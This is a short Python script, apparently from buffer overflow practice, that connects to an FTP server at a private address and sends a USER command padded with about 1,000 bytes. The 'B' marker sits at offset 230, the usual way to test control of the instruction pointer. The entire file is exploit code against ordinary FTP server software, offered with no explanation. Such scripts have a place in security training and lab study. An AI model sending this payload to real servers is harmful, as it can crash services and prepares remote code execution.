#!/usr/bin/python3

import sys,socket
from time import sleep

buffer=b"A" * 230 + b"B" * 4 + b"C"*(1000-4-230)
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.7", 21))
s.send((b"USER " +  buffer + b"\r\n"))
s.close()

